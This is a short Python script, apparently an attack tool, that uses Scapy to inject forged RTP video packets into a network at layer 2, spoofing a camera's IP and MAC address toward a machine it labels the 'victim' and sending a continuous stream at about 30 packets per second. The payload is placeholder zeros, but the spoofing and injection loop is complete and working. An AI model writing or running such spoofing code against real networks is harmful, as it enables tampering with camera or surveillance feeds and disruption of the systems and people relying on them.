from scapy.all import Ether, IP, UDP, Raw, sendp
import time
import random
import struct

# === Configure these values ===
iface = "wlan0"
victim_ip = "100.81.26.77"
victim_mac = "AA:BB:CC:DD:EE:FF"
source_ip = "100.168.1.100"  # spoofed as the camera
source_mac = "30:13:8B:7A:3D:27"
dst_port = 5004
src_port = 4000

# RTP session state
ssrc = random.randint(1, 2**32 - 1)
sequence = 0
timestamp = int(time.time() * 90000) & 0xFFFFFFFF

# === Create fake RTP packet ===
def build_rtp_packet(seq, ts):
    version = 2
    padding = 0
    extension = 0
    cc = 0
    marker = 0
    payload_type = 96  # dynamic (H264 or similar)
    
    byte1 = (version << 6) | (padding << 5) | (extension << 4) | cc
    byte2 = (marker << 7) | payload_type
    
    rtp_header = struct.pack("!BBHII", byte1, byte2, seq, ts, ssrc)
    fake_payload = b"\x00" * 160  # Replace with better RTP payload later
    
    return rtp_header + fake_payload

print("[*] Starting fake RTP stream to victim PC...")

try:
    while True:
        rtp = build_rtp_packet(sequence, timestamp)

        packet = (
            Ether(src=source_mac, dst=victim_mac) /
            IP(src=source_ip, dst=victim_ip) /
            UDP(sport=src_port, dport=dst_port) /
            Raw(load=rtp)
        )

        sendp(packet, iface=iface, verbose=False)
        print(f"[+] Sent fake RTP packet seq={sequence}, ts={timestamp}")

        sequence = (sequence + 1) % 65536
        timestamp += 160  # approx 20ms @ 8kHz audio or 30fps video
        time.sleep(0.033)  # ~30fps
except KeyboardInterrupt:
    print("\n[!] Stopped.")
